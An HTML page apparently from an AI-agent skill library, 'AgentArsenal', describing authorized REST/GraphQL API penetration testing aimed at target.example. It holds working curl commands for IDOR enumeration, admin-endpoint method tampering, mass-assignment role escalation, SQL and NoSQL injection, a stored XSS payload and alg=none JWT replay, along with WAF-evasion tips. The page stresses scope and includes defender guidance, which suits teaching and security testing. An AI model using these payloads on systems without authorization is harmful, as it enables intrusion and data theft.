@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: api-security-testing</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>api-security-testing</h2><div class="meta"><span class="badge gray">api</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">100/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when testing REST, GraphQL, or internal APIs on an</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="web-sqli.html">web-sqli</a> <a href="web-xss.html">web-xss</a> <a href="auth-attacks.html">auth-attacks</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>Postman</td><td>11.x</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>APIs carry the same business logic as web apps but with thinner client side controls, so authorization and data exposure flaws cluster there. This skill covers systematic authorized API testing: discovering every endpoint, testing the OWASP API Top 10 issue by issue, abusing object level authorization, and running repeatable Postman and Burp workflows. Test only endpoints in scope, respect rate limits, and never touch production data.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Discover endpoints: proxy the web and mobile apps, read OpenAPI or</li>
+<p>Swagger docs, and fuzz for hidden routes.</p>
+<li>Build an authenticated Postman collection with environments for two</li>
+<p>test users of different roles.</p>
+<li>Test object level authorization (BOLA/IDOR) on every endpoint that</li>
+<p>takes an ID.</p>
+<li>Test function level authorization by replaying admin calls as a low</li>
+<p>privilege user.</p>
+<li>Test mass assignment, excessive data exposure, and injection in</li>
+<p>request bodies.</p>
+<li>Test rate limiting, resource consumption, and business flow abuse.</li>
+<li>Test JWT and token handling specific to the API.</li>
+<li>Chain findings into impact (read another user&#x27;s data, escalate role)</li>
+<p>and document every request/response pair.</p>
+</ol>
+<h2>1. Discovery and mapping</h2>
+<p>APIs hide endpoints in JavaScript bundles, mobile apps, and docs. Collect them all before testing.</p>
+<pre><code class="language-bash"># Proxy traffic through Burp and export the site map, then list API paths
+# In Burp: Target &gt; Site map &gt; filter by /api, then save items
+
+# Read the OpenAPI spec when exposed
+curl -s &#x27;https://target.example/api/openapi.json&#x27; | python3 -c &quot;
+import json,sys
+spec=json.load(sys.stdin)
+for p,ops in spec.get(&#x27;paths&#x27;,{}).items():
+    print(p, sorted(ops.keys()))
+&quot;
+
+# Common doc locations worth probing (in scope only)
+for doc in openapi.json swagger.json api-docs v2/api-docs graphql; do
+  code=$(curl -s -o /dev/null -w &#x27;%{http_code}&#x27; &quot;https://target.example/$doc&quot;)
+  echo &quot;$doc -&gt; $code&quot;
+done
+
+# Fuzz for hidden endpoints with a small API wordlist, throttled
+ffuf -u &#x27;https://target.example/api/FUZZ&#x27; -w /tmp/api-words.txt \
+  -t 5 -rate 20 -mc 200,201,204,301,302,400,401,403,422</code></pre>
+<p>Build a route table: method, path, parameters, auth required, and role. Update it as you find more; the table drives every later phase.</p>
+<h2>2. Postman and Burp workflow</h2>
+<p>Use Postman for structured functional testing and Burp for attack traffic. Keep both in sync through the proxy.</p>
+<pre><code class="language-bash"># Route Postman through Burp so every call is logged and repeatable
+# Postman &gt; Settings &gt; Proxy &gt; 127.0.0.1:8080, then import the OpenAPI spec:
+# Postman &gt; Import &gt; link or file &gt; openapi.json
+
+# Export the collection for the report and for teammates
+# Postman &gt; Collection &gt; Export &gt; collection-v2.1.json</code></pre>
+<p>In Burp, scope the project to the API host, turn on the logger, and use Repeater for single-request tests and Intruder (throttled) for ID enumeration. Save interesting requests as Repeater tabs named after the finding, so the report writes itself later.</p>
+<pre><code class="language-bash"># Quick authenticated baseline: two users, compare a normal request
+curl -s &#x27;https://target.example/api/v1/orders/1001&#x27; \
+  -H &quot;Authorization: Bearer $USER_A_TOKEN&quot; | head -c 400
+curl -s &#x27;https://target.example/api/v1/orders/1001&#x27; \
+  -H &quot;Authorization: Bearer $USER_B_TOKEN&quot; | head -c 400</code></pre>
+<h2>3. BOLA and IDOR (API1:2023)</h2>
+<p>Broken object level authorization is the top API flaw: the server trusts the ID in the request without checking ownership.</p>
+<pre><code class="language-bash"># User A reads their own order, then swaps in user B&#x27;s order ID
+curl -s &#x27;https://target.example/api/v1/orders/1001&#x27; \
+  -H &quot;Authorization: Bearer $USER_A_TOKEN&quot;
+curl -s &#x27;https://target.example/api/v1/orders/1002&#x27; \
+  -H &quot;Authorization: Bearer $USER_A_TOKEN&quot; | head -c 400
+
+# Enumerate IDs with a loop (slow, throttled, in scope)
+for id in $(seq 1001 1020); do
+  code=$(curl -s -o /tmp/o_$id.json -w &#x27;%{http_code}&#x27; \
+    &quot;https://target.example/api/v1/orders/$id&quot; \
+    -H &quot;Authorization: Bearer $USER_A_TOKEN&quot;)
+  echo &quot;$id -&gt; $code&quot;
+done
+
+# Test non-sequential IDs too: UUIDs, hashes (harder to guess, still testable
+# when leaked in other responses), and nested IDs (/users/5/orders/9)</code></pre>
+<p>Test every HTTP method on the object: GET may be protected while PUT or DELETE is not. Also test ID in the body versus ID in the URL disagreeing (<code>PUT /orders/1001</code> with <code>{&quot;id&quot;: 1002}</code>), which confuses naive checks.</p>
+<h2>4. Broken function level authorization (API5:2023)</h2>
+<p>Replay privileged endpoints as a low privilege user.</p>
+<pre><code class="language-bash"># Admin endpoint called with a normal user token
+curl -s &#x27;https://target.example/api/v1/admin/users&#x27; \
+  -H &quot;Authorization: Bearer $USER_B_TOKEN&quot; -w &#x27;\nHTTP %{http_code}\n&#x27;
+
+# Hidden HTTP methods on the same path
+for m in GET POST PUT PATCH DELETE; do
+  code=$(curl -s -o /dev/null -w &#x27;%{http_code}&#x27; -X $m \
+    &#x27;https://target.example/api/v1/admin/users&#x27; \
+    -H &quot;Authorization: Bearer $USER_B_TOKEN&quot;)
+  echo &quot;$m -&gt; $code&quot;
+done</code></pre>
+<p>Watch for 403 with a body that still leaks data, and for endpoints that return 404 to unauthorized users but 200 to admins (the difference itself confirms the endpoint exists).</p>
+<h2>5. Mass assignment and excessive data exposure</h2>
+<p>Mass assignment (API3:2023) lets you set fields the client should never control, like <code>role</code> or <code>is_admin</code>.</p>
+<pre><code class="language-bash"># Register, then try to escalate through extra fields
+curl -s -X POST &#x27;https://target.example/api/v1/users&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;name&quot;:&quot;tester&quot;,&quot;email&quot;:&quot;t@example.com&quot;,&quot;pass&quot;:&quot;Test123!&quot;,&quot;role&quot;:&quot;admin&quot;,&quot;is_admin&quot;:true}&#x27;
+
+# Update profile with guessed privileged fields
+curl -s -X PATCH &#x27;https://target.example/api/v1/users/me&#x27; \
+  -H &quot;Authorization: Bearer $USER_B_TOKEN&quot; -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;role&quot;:&quot;admin&quot;}&#x27; | head -c 300
+
+# Excessive data exposure: compare API response to what the UI shows
+curl -s &#x27;https://target.example/api/v1/users/me&#x27; \
+  -H &quot;Authorization: Bearer $USER_B_TOKEN&quot; | python3 -m json.tool | head -40
+# Look for: password hashes, internal IDs, tokens, emails, SSNs, debug fields</code></pre>
+<p>If the API echoes back a <code>role</code> field you set, verify it actually took effect with a privileged call, not just the response text.</p>
+<h2>6. Injection in APIs</h2>
+<p>APIs take the same injection payloads as web forms, in JSON, query strings, and headers.</p>
+<pre><code class="language-bash"># SQL injection in a JSON field
+curl -s -X POST &#x27;https://target.example/api/v1/search&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;q&quot;:&quot;test&#x27;&quot;&#x27;&quot;&#x27; AND SLEEP(3)-- -&quot;}&#x27; -w &#x27;\n%{time_total}s\n&#x27;
+
+# NoSQL injection (Mongo-style operators)
+curl -s -X POST &#x27;https://target.example/api/v1/login&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;user&quot;:{&quot;$gt&quot;:&quot;&quot;},&quot;pass&quot;:{&quot;$gt&quot;:&quot;&quot;}}&#x27;
+
+# Stored XSS through API-fed frontends: store, then check the web UI render
+curl -s -X POST &#x27;https://target.example/api/v1/comments&#x27; \
+  -H &quot;Authorization: Bearer $USER_A_TOKEN&quot; -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;text&quot;:&quot;&lt;svg onload=alert(document.domain)&gt;&quot;}&#x27;</code></pre>
+<p>For full SQLi technique coverage (UNION, blind, error-based) use the web-sqli skill; for XSS contexts use the web-xss skill. This phase is about finding the injectable API fields.</p>
+<h2>7. Rate limiting and resource consumption (API4:2023)</h2>
+<pre><code class="language-bash"># Rate limit test: 50 fast login attempts, watch for 429
+for i in $(seq 1 50); do
+  curl -s -o /dev/null -w &#x27;%{http_code}\n&#x27; -X POST \
+    &#x27;https://target.example/api/v1/login&#x27; \
+    -H &#x27;Content-Type: application/json&#x27; -d &#x27;{&quot;user&quot;:&quot;a&quot;,&quot;pass&quot;:&quot;b&quot;}&#x27;
+done | sort | uniq -c
+
+# Expensive operation test (in scope, gentle): deep pagination
+curl -s &#x27;https://target.example/api/v1/orders?limit=1000000&amp;page=1&#x27; \
+  -H &quot;Authorization: Bearer $USER_A_TOKEN&quot; -w &#x27;\n%{time_total}s %{size_download}b\n&#x27; -o /dev/null
+
+# Batch endpoint abuse: one request that triggers N operations
+curl -s -X POST &#x27;https://target.example/api/v1/notify/batch&#x27; \
+  -H &quot;Authorization: Bearer $USER_A_TOKEN&quot; -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;ids&quot;:[1,2,3,4,5]}&#x27; -w &#x27;\nHTTP %{http_code}\n&#x27;</code></pre>
+<p>Report missing limits with the request count that proved it, and never run a real denial of service test.</p>
+<h2>8. JWT and token handling in APIs</h2>
+<pre><code class="language-bash"># Check token transport and lifetime
+curl -s -D - &#x27;https://target.example/api/v1/users/me&#x27; \
+  -H &quot;Authorization: Bearer $USER_A_TOKEN&quot; -o /dev/null | grep -i -E &#x27;set-cookie|authorization&#x27;
+
+# Replay an expired token, a token with alg=none, and a tampered claim
+# (craft tokens with the script from the auth-attacks skill)
+curl -s &#x27;https://target.example/api/v1/users/me&#x27; \
+  -H &quot;Authorization: Bearer $NONE_ALG_TOKEN&quot; -w &#x27;\nHTTP %{http_code}\n&#x27;
+
+# Scope test: token issued for read-only scope used on a write endpoint
+curl -s -X POST &#x27;https://target.example/api/v1/orders&#x27; \
+  -H &quot;Authorization: Bearer $READ_SCOPE_TOKEN&quot; \
+  -H &#x27;Content-Type: application/json&#x27; -d &#x27;{&quot;item&quot;:&quot;x&quot;}&#x27; -w &#x27;\nHTTP %{http_code}\n&#x27;</code></pre>
+<p>Also verify logout revokes refresh tokens, and that the API rejects tokens issued for a different audience.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>The API returns 200 with an error object instead of HTTP error codes.</li>
+<p>Parse the body, not the status, when classifying results.</p>
+<li>IDs are UUIDs. BOLA still applies when UUIDs leak in list responses,</li>
+<p>shared links, or logs; test with leaked values rather than guessing.</p>
+<li>GraphQL is in use. Introspection may be on; test field level</li>
+<p>authorization per type, and batching for rate limit bypass.</p>
+<li>The API versions paths (<code>/v1</code>, <code>/v2</code>). Old versions often keep old</li>
+<p>flaws; test every version you find.</p>
+<li>Requests need signed parameters or HMAC. Get the signing logic from</li>
+<p>the mobile app or JS bundle in scope before testing further.</p>
+<li>403 responses differ subtly from 404s. Normalize your comparisons</li>
+<p>(strip timestamps and request IDs) before concluding.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>BOLA enumeration is slow: narrow ID ranges from list endpoints, and</li>
+<p>test a sample across roles instead of the full range.</p>
+<li>WAF blocks fuzzing: reduce rate, rotate user agents, and focus on</li>
+<p>logic flaws (BOLA, mass assignment) which need few requests.</p>
+<li>No docs and no JS bundle: enumerate via the mobile app proxy or</li>
+<p>OPTIONS requests per path to learn allowed methods.</p>
+<li>Auth is mTLS or client certificates: request test certificates from</li>
+<p>the client; do not attempt to bypass certificate validation.</p>
+<li>Findings look low impact alone: chain them (BOLA read plus mass</li>
+<p>assignment write, or excessive data exposure feeding IDOR targets).</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see API attacks as ID enumeration sweeps (sequential IDs from one token), method tampering on admin paths, mass assignment probes with <code>role</code> or <code>is_admin</code> fields, and token replay with modified claims. Good defenses are per-object authorization checks on every endpoint, strict input schemas that drop unknown fields, rate limiting per user and per endpoint, short-lived scoped tokens, and logging the authenticated user ID with every request for traceability.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1190 (Exploit Public-Facing Application).</li>
+<li>OWASP API Security Top 10 2023: API1 Broken Object Level</li>
+<p>Authorization, API2 Broken Authentication, API3 Broken Object Property Level Authorization, API4 Unrestricted Resource Consumption, API5 Broken Function Level Authorization.</p>
+<li>CWE-639 (Authorization Bypass Through User-Controlled Key),</li>
+<p>CWE-862 (Missing Authorization), CWE-863 (Incorrect Authorization).</p>
+<li>CWE-915 (Improperly Controlled Modification of Object Attributes):</li>
+<p>mass assignment.</p>
+<li>CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor):</li>
+<p>excessive data exposure.</p>
+<li>OWASP API Security Project cheat sheets and Postman testing guides.</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
